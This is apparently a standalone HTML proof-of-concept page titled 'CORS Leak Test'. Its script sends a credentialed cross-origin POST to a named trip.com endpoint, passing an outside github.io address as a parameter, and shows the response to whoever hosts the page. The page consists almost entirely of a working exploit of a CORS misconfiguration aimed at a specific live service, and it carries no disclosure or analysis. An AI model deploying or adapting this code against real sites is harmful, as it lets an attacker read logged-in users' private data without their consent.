<!DOCTYPE html>

<html>

<head>

<title>CORS POC</title>

</head>

<body>

<h1>CORS Leak Test</h1>

<button onclick="testCORS()">Run Test</button>

<pre id="output">Waiting...</pre>

<script>

async function testCORS() {

document.getElementById("output").textContent = "Sending request...";

try {

const res = await fetch("https://chloro.trip.com/v2/d", {

method: "POST",

credentials: "include",

headers: {

"Content-Type": "application/x-www-form-urlencoded"

},

body: "data=whatever&version=9&serverName=https://sea8ye.github.io/"

});

const text = await res.text();

document.getElementById("output").textContent = "Success:\n\n" + text;

} catch (err) {

document.getElementById("output").textContent = "Error:\n\n" + err;

}

}

</script>

</body>

</html>
